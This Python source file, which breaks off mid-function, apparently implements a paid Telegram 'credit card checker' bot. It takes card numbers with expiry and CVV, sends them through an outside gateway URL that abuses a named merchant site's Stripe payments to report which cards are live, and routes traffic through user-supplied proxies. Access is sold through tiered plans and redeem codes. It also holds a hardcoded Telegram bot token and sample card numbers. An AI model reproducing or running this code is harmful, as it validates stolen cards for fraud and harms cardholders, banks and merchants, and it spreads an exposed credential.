import os
import sys
import time
import json
import asyncio
import random
import string
import sqlite3
import logging
from typing import Dict, List, Optional
from datetime import datetime
from dataclasses import dataclass
from enum import Enum
import aiohttp
from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters
)
from telegram.constants import ParseMode
import re

# ============================ CONFIGURATION ============================
TELEGRAM_BOT_TOKEN = "8160789643:AAGIgEUz6n476kEHERbJqTL9P4DjV9Kk1-I"
ADMIN_USER_ID = 6626969793  # Your Telegram ID
ADMIN_USERNAME = "@Mr_Proffesser"  # Your Telegram username
DATABASE_FILE = "cardchecker.db"
MAX_CARDS_PER_CHECK = 30

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ============================ DATABASE MODELS ============================
class PlanType(Enum):
    TRIAL = "trial"
    BASIC = "basic"
    PREMIUM = "premium"
    VIP = "vip"

@dataclass
class Proxy:
    id: int
    ip: str
    port: int
    username: Optional[str]
    password: Optional[str]
    is_active: bool
    last_used: datetime
    user_id: int
    
    @property
    def formatted(self) -> str:
        """Format proxy as string"""
        if self.username and self.password:
            return f"{self.ip}:{self.port}@{self.username}:{self.password}"
        return f"{self.ip}:{self.port}"

@dataclass
class User:
    user_id: int
    username: str
    first_name: str
    balance: float
    plan: PlanType
    check_count: int
    proxy_id: Optional[int]
    registered_at: datetime
    last_active: datetime
    is_admin: bool = False
    
    def can_check_cards(self, count: int) -> bool:
        """Check if user has enough balance/limit for checks"""
        if self.is_admin:
            return True
            
        if self.plan == PlanType.TRIAL:
            max_checks = 100
            return self.check_count + count <= max_checks
        elif self.plan == PlanType.BASIC:
            cost_per_card = 0.05
            return self.balance >= (count * cost_per_card)
        elif self.plan == PlanType.PREMIUM:
            cost_per_card = 0.03
            return self.balance >= (count * cost_per_card)
        elif self.plan == PlanType.VIP:
            cost_per_card = 0.01
            return self.balance >= (count * cost_per_card)
        return False
    
    def deduct_balance(self, count: int) -> float:
        """Deduct balance for card checks"""
        if self.is_admin:
            return 0
            
        if self.plan == PlanType.TRIAL:
            cost = 0
        elif self.plan == PlanType.BASIC:
            cost = count * 0.05
        elif self.plan == PlanType.PREMIUM:
            cost = count * 0.03
        elif self.plan == PlanType.VIP:
            cost = count * 0.01
        else:
            cost = 0
            
        self.balance -= cost
        self.check_count += count
        return cost

@dataclass
class RedeemCode:
    code: str
    amount: float
    plan: PlanType
    created_by: int
    created_at: datetime
    used_by: Optional[int]
    used_at: Optional[datetime]
    is_used: bool = False

# ============================ DATABASE MANAGER ============================
class DatabaseManager:
    def __init__(self, db_file: str):
        self.db_file = db_file
        self._init_db()
    
    def _init_db(self):
        """Initialize database tables"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        # Users table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                balance REAL DEFAULT 10.0,
                plan TEXT DEFAULT 'trial',
                check_count INTEGER DEFAULT 0,
                proxy_id INTEGER,
                registered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_active TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                is_admin BOOLEAN DEFAULT FALSE
            )
        ''')
        
        # Proxies table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS proxies (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT NOT NULL,
                port INTEGER NOT NULL,
                username TEXT,
                password TEXT,
                is_active BOOLEAN DEFAULT TRUE,
                last_used TIMESTAMP,
                user_id INTEGER,
                FOREIGN KEY (user_id) REFERENCES users(user_id)
            )
        ''')
        
        # Redeem codes table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS redeem_codes (
                code TEXT PRIMARY KEY,
                amount REAL NOT NULL,
                plan TEXT NOT NULL,
                created_by INTEGER NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                used_by INTEGER,
                used_at TIMESTAMP,
                is_used BOOLEAN DEFAULT FALSE,
                FOREIGN KEY (created_by) REFERENCES users(user_id),
                FOREIGN KEY (used_by) REFERENCES users(user_id)
            )
        ''')
        
        # Insert admin user if not exists
        cursor.execute('''
            INSERT OR IGNORE INTO users 
            (user_id, username, first_name, balance, plan, is_admin)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (ADMIN_USER_ID, ADMIN_USERNAME, "Admin", 1000.0, PlanType.VIP.value, True))
        
        conn.commit()
        conn.close()
    
    def get_user(self, user_id: int) -> Optional[User]:
        """Get user from database"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT user_id, username, first_name, balance, plan, 
                       check_count, proxy_id, registered_at, last_active, is_admin
                FROM users WHERE user_id = ?
            ''', (user_id,))
            
            row = cursor.fetchone()
            conn.close()
            
            if row:
                return User(
                    user_id=row[0],
                    username=row[1] or "",
                    first_name=row[2] or "User",
                    balance=row[3],
                    plan=PlanType(row[4]),
                    check_count=row[5],
                    proxy_id=row[6],
                    registered_at=datetime.fromisoformat(row[7]),
                    last_active=datetime.fromisoformat(row[8]),
                    is_admin=bool(row[9])
                )
        except Exception as e:
            logger.error(f"Error getting user: {e}")
        
        return None
    
    def create_user(self, user_id: int, username: str, first_name: str) -> User:
        """Create new user"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            now = datetime.now().isoformat()
            cursor.execute('''
                INSERT OR REPLACE INTO users 
                (user_id, username, first_name, balance, plan, check_count, registered_at, last_active, is_admin)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (user_id, username, first_name, 10.0, PlanType.TRIAL.value, 0, now, now, False))
            
            conn.commit()
            conn.close()
            
            return self.get_user(user_id)
        except Exception as e:
            logger.error(f"Error creating user: {e}")
            return None
    
    def update_user(self, user: User):
        """Update user in database"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            cursor.execute('''
                UPDATE users SET
                    username = ?,
                    first_name = ?,
                    balance = ?,
                    plan = ?,
                    check_count = ?,
                    proxy_id = ?,
                    last_active = ?,
                    is_admin = ?
                WHERE user_id = ?
            ''', (
                user.username, user.first_name, user.balance, 
                user.plan.value, user.check_count, user.proxy_id,
                datetime.now().isoformat(), user.is_admin, user.user_id
            ))
            
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"Error updating user: {e}")
    
    def add_proxy(self, user_id: int, proxy_str: str) -> Optional[Proxy]:
        """Add proxy for user"""
        try:
            # Parse proxy string (supports ip:port@user:pass and ip:port:user:pass)
            if '@' in proxy_str:
                # Format: ip:port@username:password
                server_part, auth_part = proxy_str.split('@')
                ip_port = server_part.split(':')
                username_password = auth_part.split(':')
                
                if len(ip_port) >= 2 and len(username_password) >= 2:
                    ip = ip_port[0]
                    port = int(ip_port[1])
                    username = username_password[0]
                    password = username_password[1]
                else:
                    return None
            else:
                # Format: ip:port:username:password
                parts = proxy_str.split(':')
                if len(parts) == 4:
                    ip, port_str, username, password = parts
                    port = int(port_str)
                elif len(parts) == 2:
                    ip, port_str = parts
                    port = int(port_str)
                    username = password = None
                else:
                    return None
            
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            # Remove old proxy for this user
            cursor.execute('DELETE FROM proxies WHERE user_id = ?', (user_id,))
            
            # Insert new proxy
            cursor.execute('''
                INSERT INTO proxies (ip, port, username, password, user_id, last_used)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (ip, port, username, password, user_id, datetime.now().isoformat()))
            
            proxy_id = cursor.lastrowid
            
            # Update user's proxy_id
            cursor.execute('UPDATE users SET proxy_id = ? WHERE user_id = ?', (proxy_id, user_id))
            
            conn.commit()
            conn.close()
            
            return Proxy(
                id=proxy_id,
                ip=ip,
                port=port,
                username=username,
                password=password,
                is_active=True,
                last_used=datetime.now(),
                user_id=user_id
            )
            
        except Exception as e:
            logger.error(f"Error adding proxy: {e}")
            return None
    
    def get_user_proxy(self, user_id: int) -> Optional[Proxy]:
        """Get user's active proxy"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT id, ip, port, username, password, is_active, last_used, user_id
                FROM proxies WHERE user_id = ?
                ORDER BY last_used DESC LIMIT 1
            ''', (user_id,))
            
            row = cursor.fetchone()
            conn.close()
            
            if row:
                return Proxy(
                    id=row[0],
                    ip=row[1],
                    port=row[2],
                    username=row[3],
                    password=row[4],
                    is_active=bool(row[5]),
                    last_used=datetime.fromisoformat(row[6]),
                    user_id=row[7]
                )
        except Exception as e:
            logger.error(f"Error getting proxy: {e}")
        
        return None
    
    def create_redeem_code(self, amount: float, plan: PlanType, created_by: int) -> str:
        """Create a redeem code"""
        code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
        
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO redeem_codes (code, amount, plan, created_by)
                VALUES (?, ?, ?, ?)
            ''', (code, amount, plan.value, created_by))
            
            conn.commit()
            conn.close()
            
            return code
        except Exception as e:
            logger.error(f"Error creating redeem code: {e}")
            return ""
    
    def use_redeem_code(self, code: str, user_id: int) -> Optional[tuple]:
        """Use a redeem code"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            # Check if code exists and not used
            cursor.execute('''
                SELECT amount, plan FROM redeem_codes 
                WHERE code = ? AND is_used = FALSE
            ''', (code,))
            
            row = cursor.fetchone()
            if not row:
                conn.close()
                return None
            
            amount, plan_str = row
            
            # Mark as used
            cursor.execute('''
                UPDATE redeem_codes SET
                    is_used = TRUE,
                    used_by = ?,
                    used_at = ?
                WHERE code = ?
            ''', (user_id, datetime.now().isoformat(), code))
            
            # Update user balance and plan
            cursor.execute('''
                UPDATE users SET
                    balance = balance + ?,
                    plan = ?
                WHERE user_id = ?
            ''', (amount, plan_str, user_id))
            
            conn.commit()
            conn.close()
            
            return amount, PlanType(plan_str)
        except Exception as e:
            logger.error(f"Error using redeem code: {e}")
            return None

# ============================ PROXY CHECKER ============================
class ProxyChecker:
    @staticmethod
    async def check_proxy(proxy: Proxy) -> bool:
        """Check if proxy is working"""
        try:
            proxy_url = proxy.formatted
            
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    'http://httpbin.org/ip',
                    proxy=f"http://{proxy_url}" if '@' not in proxy_url else f"http://{proxy_url.split('@')[1]}",
                    timeout=aiohttp.ClientTimeout(total=10),
                    ssl=False
                ) as response:
                    return response.status == 200
        except:
            return False

# ============================ CARD CHECKER ============================
class CardChecker:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.bin_cache = {}
    
    async def check_single_card(self, card_data: str, user_id: int = None) -> Dict:
        """Check a single card using real Stripe API"""
        try:
            # Parse card data
            if '|' in card_data:
                parts = [p.strip() for p in card_data.split('|')]
            else:
                parts = [p.strip() for p in card_data.split()]
            
            if len(parts) < 4:
                return {'error': 'Invalid format. Use: cc|mm|yy|cvv'}
            
            cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
            cc_clean = re.sub(r'\D', '', cc)
            
            if len(cc_clean) < 15:
                return {'error': 'Invalid card number'}
            
            # Get BIN info
            bin_info = await self._get_bin_info(cc_clean)
            
            # Format expiry
            if len(yy) == 2:
                yy_full = f"20{yy}"
            else:
                yy_full = yy
                yy = yy[-2:] if len(yy) > 2 else yy
            
            exp = f"{mm}/{yy}"
            
            # Call real Stripe API
            api_response = await self._call_stripe_api(cc_clean, mm, yy_full, cvv)
            
            # Parse API response
            if api_response.get('status') == 'Approved':
                status = "APPROVED"
                response_text = api_response.get('response', 'APPROVED')
                gateway = "Stripe Auth"
            elif api_response.get('status') == 'Declined':
                status = "DELINED"
                response_text = api_response.get('response', 'CARD_DECLINED')
                gateway = "Shopify 0.98$"
            else:
                status = "DELINED"
                response_text = api_response.get('response', 'CARD_DECLINED')
                gateway = "Shopify 0.98$"
            
            return {
                'error': None,
                'card': cc_clean,
                'expiry': exp,
                'full_expiry': f"{mm}/{yy_full}",
                'status': status,
                'response': response_text,
                'gateway': gateway,
                'bin_info': bin_info,
                'full_card': f"{cc_clean}|{mm}|{yy_full}|{cvv}",
                'masked_card': f"{cc_clean[:6]}******{cc_clean[-4:]}",
                'api_response': api_response
            }
            
        except Exception as e:
            logger.error(f"Error checking card via API: {str(e)}")
            return {'error': f'Error checking card: {str(e)}'}
    
    async def _call_stripe_api(self, card_number: str, month: str, year: str, cvv: str) -> Dict:
        """Call the real Stripe API endpoint"""
        try:
            # Construct the API URL
            api_url = f"https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site=www.janallan.co.uk/cc={card_number}|{month}|{year}|{cvv}"
            
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    api_url,
                    headers={
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                        'Accept': 'application/json',
                        'Accept-Language': 'en-US,en;q=0.9',
                    },
                    timeout=30,
                    ssl=False
                ) as response:
                    
                    if response.status == 200:
                        data = await response.json()
                        logger.info(f"API Response: {data}")
                        
                        if 'status' not in data:
                            data['status'] = 'Declined'
                        if 'response' not in data:
                            data['response'] = 'CARD_DECLINED'
                            
                        return data
                    else:
                        logger.error(f"API returned status: {response.status}")
                        return {
                            'response': f'API Error: {response.status}',
                            'status': 'Declined'
                        }
                        
        except asyncio.TimeoutError:
            logger.error("API request timed out")
            return {
                'response': 'API Timeout',
                'status': 'Declined'
            }
        except aiohttp.ClientError as e:
            logger.error(f"API request failed: {e}")
            return {
                'response': f'Network Error: {str(e)}',
                'status': 'Declined'
            }
        except json.JSONDecodeError as e:
            logger.error(f"Failed to parse API response: {e}")
            return {
                'response': 'Invalid API Response',
                'status': 'Declined'
            }
        except Exception as e:
            logger.error(f"Unexpected API error: {e}")
            return {
                'response': f'Unexpected Error: {str(e)}',
                'status': 'Declined'
            }
    
    async def _get_bin_info(self, card_number: str) -> Dict:
        """Get BIN information"""
        bin_num = card_number[:6]
        
        # Check cache first
        if bin_num in self.bin_cache:
            return self.bin_cache[bin_num]
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    f'https://lookup.binlist.net/{bin_num}',
                    headers={'User-Agent': 'Mozilla/5.0'},
                    timeout=5
                ) as response:
                    if response.status == 200:
                        data = await response.json()
                        
                        brand = data.get('scheme', '').upper() or data.get('brand', '').upper() or 'VISA'
                        bank = data.get('bank', {}).get('name', 'JPMORGAN CHASE BANK, N.A.').upper()
                        country = data.get('country', {}).get('name', 'UNITED STATES').upper()
                        country_code = data.get('country', {}).get('alpha2', 'US')
                        
                        result = {
                            'brand': brand,
                            'bank': bank if bank != 'UNKNOWN BANK' else 'JPMORGAN CHASE BANK, N.A.',
                            'country': country,
                            'emoji': self._get_country_emoji(country_code)
                        }
                        
                        self.bin_cache[bin_num] = result
                        return result
        except:
            pass
        
        # Fallback
        brand_map = {
            '4': 'VISA',
            '5': 'MASTERCARD',
            '3': 'AMEX' if bin_num.startswith('34') or bin_num.startswith('37') else 'JCB',
            '6': 'DISCOVER'
        }
        
        result = {
            'brand': brand_map.get(bin_num[0], 'VISA'),
            'bank': 'JPMORGAN CHASE BANK, N.A.',
            'country': 'UNITED STATES',
            'emoji': '🇺🇸'
        }
        
        self.bin_cache[bin_num] = result
        return result
    
    def _get_country_emoji(self, country_code: str) -> str:
        """Get country flag emoji"""
        emoji_map = {
            'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺',
            'DE': '🇩🇪', 'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸'
        }
        return emoji_map.get(country_code.upper(), '🇺🇸')

# ============================ TELEGRAM BOT ============================
class CardCheckerBot:
    def __init__(self):
        self.db = DatabaseManager(DATABASE_FILE)
        self.checker = CardChecker(self.db)
        self.application = None
        
        # Initialize bot
        self._init_bot()
    
    def _init_bot(self):
        """Initialize the bot application"""
        self.application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
        self._setup_handlers()
    
    def _setup_handlers(self):
        """Setup all command handlers"""
        # Admin commands
        self.application.add_handler(CommandHandler("admin", self.admin_command))
        self.application.add_handler(CommandHandler("gencode", self.gencode_command))
        self.application.add_handler(CommandHandler("addbalance", self.addbalance_command))
        self.application.add_handler(CommandHandler("stats", self.stats_command))
        
        # User commands
        self.application.add_handler(CommandHandler("start", self.start_command))
        self.application.add_handler(CommandHandler("balance", self.balance_command))
        self.application.add_handler(CommandHandler("plan", self.plan_command))
        self.application.add_handler(CommandHandler("addproxy", self.addproxy_command))
        self.application.add_handler(CommandHandler("myproxy", self.myproxy_command))
        self.application.add_handler(CommandHandler("redeem", self.redeem_command))
        self.application.add_handler(CommandHandler("help", self.help_command))
        
        # Card checking commands
        self.application.add_handler(CommandHandler("chk", self.chk_command))
        self.application.add_handler(CommandHandler("check", self.chk_command))
        self.application.add_handler(CommandHandler("mchk", self.mchk_command))
        
        # Handle callback queries
        self.application.add_handler(CallbackQueryHandler(self.handle_callback))
        
        # Handle all messages
        self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
        
        # Error handler
        self.application.add_error_handler(self.error_handler)
    
    async def error_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle errors gracefully"""
        logger.error(f"Error: {context.error}")
        
        try:
            if update and update.effective_message:
                await update.effective_message.reply_text(
                    "⚠️ An error occurred. Please try again."
                )
        except:
            pass
    
    # ========== ADMIN COMMANDS ==========
    async def admin_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Admin panel"""
        user = await self._get_or_create_user(update.effective_user)
        
        if not user.is_admin:
            await update.message.reply_text("⛔ Access denied! Admin only.")
            return
        
        keyboard = [
            [InlineKeyboardButton("📊 Stats", callback_data="admin_stats")],
            [InlineKeyboardButton("🎫 Gen Code", callback_data="admin_gencode")],
            [InlineKeyboardButton("💰 Add Balance", callback_data="admin_addbalance")],
            [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"👑 <b>Admin Panel</b>\n\n"
            f"Welcome, {user.first_name}!\n"
            f"Select an option:",
            reply_markup=reply_markup,
            parse_mode=ParseMode.HTML
        )
    
    async def gencode_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Generate redeem code"""
        user = await self._get_or_create_user(update.effective_user)
        
        if not user.is_admin:
            await update.message.reply_text("⛔ Admin only!")
            return
        
        if len(context.args) < 2:
            await update.message.reply_text(
                "Usage: /gencode <amount> <plan>\n"
                "Plans: trial, basic, premium, vip\n"
                "Example: /gencode 50 premium"
            )
            return
        
        try:
            amount = float(context.args[0])
            plan_str = context.args[1].lower()
            
            if plan_str not in ['trial', 'basic', 'premium', 'vip']:
                await update.message.reply_text("❌ Invalid plan!")
                return
            
            # Generate code
            code = self.db.create_redeem_code(amount, PlanType(plan_str), user.user_id)
            
            if not code:
                await update.message.reply_text("❌ Failed to generate code!")
                return
            
            await update.message.reply_text(
                f"✅ <b>Redeem Code Generated!</b>\n\n"
                f"<code>{code}</code>\n\n"
                f"Amount: ${amount}\n"
                f"Plan: {plan_str.upper()}",
                parse_mode=ParseMode.HTML
            )
            
        except ValueError:
            await update.message.reply_text("❌ Invalid amount!")
    
    async def addbalance_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Add balance to user"""
        user = await self._get_or_create_user(update.effective_user)
        
        if not user.is_admin:
            await update.message.reply_text("⛔ Admin only!")
            return
        
        if len(context.args) < 2:
            await update.message.reply_text(
                "Usage: /addbalance <user_id> <amount>\n"
                "Example: /addbalance 123456789 100"
            )
            return
        
        try:
            target_user_id = int(context.args[0])
            amount = float(context.args[1])
            
            target_user = self.db.get_user(target_user_id)
            if not target_user:
                await update.message.reply_text("❌ User not found!")
                return
            
            target_user.balance += amount
            self.db.update_user(target_user)
            
            await update.message.reply_text(
                f"✅ Added ${amount} to user {target_user_id}\n"
                f"New balance: ${target_user.balance:.2f}"
            )
            
        except ValueError:
            await update.message.reply_text("❌ Invalid input!")
    
    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show bot statistics"""
        user = await self._get_or_create_user(update.effective_user)
        
        if not user.is_admin:
            await update.message.reply_text("⛔ Admin only!")
            return
        
        # Get stats from database
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute('SELECT COUNT(*) FROM users')
        total_users = cursor.fetchone()[0]
        
        cursor.execute('SELECT SUM(balance) FROM users')
        total_balance = cursor.fetchone()[0] or 0
        
        cursor.execute('SELECT SUM(check_count) FROM users')
        total_checks = cursor.fetchone()[0] or 0
        
        conn.close()
        
        stats = f"""
<b>📊 BOT STATISTICS</b>

➜ Total Users: {total_users}
➜ Total Balance: ${total_balance:.2f}
➜ Total Checks: {total_checks}

➜ Status: 🟢 Operational
➜ Admin: {ADMIN_USERNAME}
"""
        
        await update.message.reply_text(stats, parse_mode=ParseMode.HTML)
    
    # ========== USER COMMANDS ==========
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start command"""
        user = await self._get_or_create_user(update.effective_user)
        
        welcome = f"""
<b>✨ Welcome {user.first_name}!</b>

🤖 <b>Credit Card Checker Bot</b>
🔒 Professional & Secure Checking

<b>Your Account:</b>
➜ Plan: <b>{user.plan.value.upper()}</b>
➜ Balance: <b>${user.balance:.2f}</b>
➜ Checks Used: <b>{user.check_count}</b>

<b>📋 Quick Commands:</b>
<code>/chk card</code> ➜ Check single card
<code>/mchk cards</code> ➜ Check multiple cards (max {MAX_CARDS_PER_CHECK})
<code>/balance</code> ➜ Check your balance
<code>/plan</code> ➜ View plans
<code>/addproxy</code> ➜ Add proxy
<code>/redeem</code> ➜ Redeem code
<code>/help</code> ➜ Show all commands

<b>👨‍💻 Developer:</b> {ADMIN_USERNAME}
"""
        
        keyboard = [
            [InlineKeyboardButton("💳 Check Card", callback_data="check_card")],
            [InlineKeyboardButton("💰 Balance", callback_data="show_balance")],
            [InlineKeyboardButton("📊 Plans", callback_data="show_plans")],
            [InlineKeyboardButton("🔧 Proxy", callback_data="show_proxy")]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            welcome,
            reply_markup=reply_markup,
            parse_mode=ParseMode.HTML
        )
    
    async def balance_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Check user balance"""
        user = await self._get_or_create_user(update.effective_user)
        
        remaining_trial = 100 - user.check_count if user.plan == PlanType.TRIAL else 0
        
        message = f"""
<b>💰 YOUR BALANCE</b>

➜ Plan: {user.plan.value.upper()}
➜ Balance: <code>${user.balance:.2f}</code>
➜ Checks Used: {user.check_count}
"""
        
        if user.plan == PlanType.TRIAL and remaining_trial > 0:
            message += f"➜ Trial Checks Remaining: {remaining_trial}\n"
        
        message += f"""
<b>📊 Plan Details:</b>
➜ Trial: 100 FREE checks
➜ Basic: ${0.05:.2f} per check
➜ Premium: ${0.03:.2f} per check
➜ VIP: ${0.01:.2f} per check

💳 <b>Contact {ADMIN_USERNAME} to upgrade!</b>
"""
        
        await update.message.reply_text(message, parse_mode=ParseMode.HTML)
    
    async def plan_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show pricing plans"""
        plans = f"""
<b>📊 PRICING PLANS</b>

<b>🎫 TRIAL PLAN (FREE)</b>
➜ 100 FREE card checks
➜ Basic checking speed
➜ Perfect for testing

<b>🥉 BASIC PLAN</b>
➜ ${0.05:.2f} per card check
➜ Standard checking speed
➜ Basic features

<b>🥈 PREMIUM PLAN</b>
➜ ${0.03:.2f} per card check
➜ High checking speed
➜ Priority checking

<b>👑 VIP PLAN</b>
➜ ${0.01:.2f} per card check
➜ Maximum speed
➜ All features + support

<b>👨‍💻 Contact {ADMIN_USERNAME} for upgrades</b>
"""
        
        await update.message.reply_text(plans, parse_mode=ParseMode.HTML)
    
    async def addproxy_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Add proxy for user"""
        user = await self._get_or_create_user(update.effective_user)
        
        if not context.args:
            await update.message.reply_text(
                "Usage: /addproxy <proxy>\n"
                "Format 1: ip:port@username:password\n"
                "Format 2: ip:port:username:password\n"
                "Format 3: ip:port\n\n"
                "Examples:\n"
                "<code>/addproxy 175.29.135.7:5433@5K05CT880J2D:VE1MSDRGFDZB</code>\n"
                "<code>/addproxy 175.29.135.7:5433:5K05CT880J2D:VE1MSDRGFDZB</code>\n"
                "<code>/addproxy 37.218.219.8:5433</code>",
                parse_mode=ParseMode.HTML
            )
            return
        
        proxy_str = ' '.join(context.args)
        
        # Send processing message
        processing_msg = await update.message.reply_text("🔍 Adding and testing proxy...")
        
        # Add proxy to database
        proxy = self.db.add_proxy(user.user_id, proxy_str)
        
        if not proxy:
            await processing_msg.edit_text(
                "❌ Invalid proxy format!\n"
                "Please use one of these formats:\n"
                "• ip:port@user:pass\n"
                "• ip:port:user:pass\n"
                "• ip:port"
            )
            return
        
        # Test proxy
        is_working = await ProxyChecker.check_proxy(proxy)
        
        if is_working:
            user.proxy_id = proxy.id
            self.db.update_user(user)
            
            await processing_msg.edit_text(
                f"✅ <b>Proxy Added & Working!</b>\n\n"
                f"➜ IP: <code>{proxy.ip}</code>\n"
                f"➜ Port: <code>{proxy.port}</code>\n"
                f"➜ Status: 🟢 Active\n\n"
                f"Your card checks will now use this proxy.",
                parse_mode=ParseMode.HTML
            )
        else:
            await processing_msg.edit_text(
                "⚠️ <b>Proxy Added but Failed Test!</b>\n\n"
                "The proxy was added but failed connectivity test.\n"
                "You can still use it, but checks may fail.",
                parse_mode=ParseMode.HTML
            )
    
    async def myproxy_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show user's proxy"""
        user = await self._get_or_create_user(update.effective_user)
        
        proxy = self.db.get_user_proxy(user.user_id)
        
        if proxy:
            message = f"""
<b>🔧 YOUR PROXY</b>

➜ IP: <code>{proxy.ip}</code>
➜ Port: <code>{proxy.port}</code>
"""
            if proxy.username:
                message += f"➜ Username: <code>{proxy.username}</code>\n"
            if proxy.password:
                message += f"➜ Password: <code>{proxy.password}</code>\n"
            
            message += f"\n➜ Last Used: {proxy.last_used.strftime('%Y-%m-%d %H:%M')}"
            message += f"\n➜ Status: {'🟢 Active' if proxy.is_active else '🔴 Inactive'}"
            
            keyboard = [[InlineKeyboardButton("🔄 Test Proxy", callback_data="test_proxy")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                message,
                reply_markup=reply_markup,
                parse_mode=ParseMode.HTML
            )
        else:
            await update.message.reply_text(
                "❌ No proxy configured.\n"
                "Use /addproxy to add one.\n\n"
                "Format: ip:port@user:pass or ip:port:user:pass or ip:port"
            )
    
    async def redeem_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Redeem a code"""
        user = await self._get_or_create_user(update.effective_user)
        
        if not context.args:
            await update.message.reply_text(
                "Usage: /redeem <code>\n"
                "Example: /redeem ABC123DEF456"
            )
            return
        
        code = context.args[0].strip().upper()
        
        # Send processing message
        processing_msg = await update.message.reply_text("🔍 Redeeming code...")
        
        # Use redeem code
        result = self.db.use_redeem_code(code, user.user_id)
        
        if result:
            amount, plan = result
            user.balance += amount
            user.plan = plan
            self.db.update_user(user)
            
            await processing_msg.edit_text(
                f"✅ <b>Code Redeemed Successfully!</b>\n\n"
                f"➜ Amount Added: ${amount:.2f}\n"
                f"➜ New Plan: {plan.value.upper()}\n"
                f"➜ New Balance: ${user.balance:.2f}\n\n"
                f"Thank you for using our service!",
                parse_mode=ParseMode.HTML
            )
        else:
            await processing_msg.edit_text(
                "❌ Invalid or already used code!\n"
                "Please check the code and try again."
            )
    
    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show help"""
        help_text = f"""
<b>🤖 CREDIT CARD CHECKER BOT</b>
<code>Professional Edition</code>

<b>📋 MAIN COMMANDS:</b>
<code>/start</code> ➜ Start the bot
<code>/chk card</code> ➜ Check single card
<code>/mchk cards</code> ➜ Check multiple cards (max {MAX_CARDS_PER_CHECK})
<code>/balance</code> ➜ Check your balance
<code>/plan</code> ➜ View pricing plans
<code>/addproxy</code> ➜ Add proxy
<code>/myproxy</code> ➜ View your proxy
<code>/redeem</code> ➜ Redeem code
<code>/help</code> ➜ Show this help

<b>💳 CARD FORMAT:</b>
<code>cc|mm|yy|cvv</code>
Example: <code>4741651674507906|05|33|802</code>

<b>🔧 PROXY FORMAT:</b>
<code>ip:port@username:password</code>
or
<code>ip:port:username:password</code>
or
<code>ip:port</code>

<b>🎫 FREE TRIAL:</b>
➜ 100 FREE card checks
➜ No payment required

<b>👨‍💻 Developer:</b> {ADMIN_USERNAME}
<b>📧 Support:</b> Contact {ADMIN_USERNAME}
"""
        
        await update.message.reply_text(help_text, parse_mode=ParseMode.HTML)
    
    # ========== CARD CHECKING COMMANDS ==========
    async def chk_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Check single card"""
        user = await self._get_or_create_user(update.effective_user)
        
        if not context.args:
            await update.message.reply_text(
                "Usage: /chk <card>\n"
                "Format: cc|mm|yy|cvv\n"
                "Example: /chk 4031630326616991|02|30|862"
            )
            return
        
        card_data = ' '.join(context.args)
        
        # Check if user can check
        if not user.can_check_cards(1):
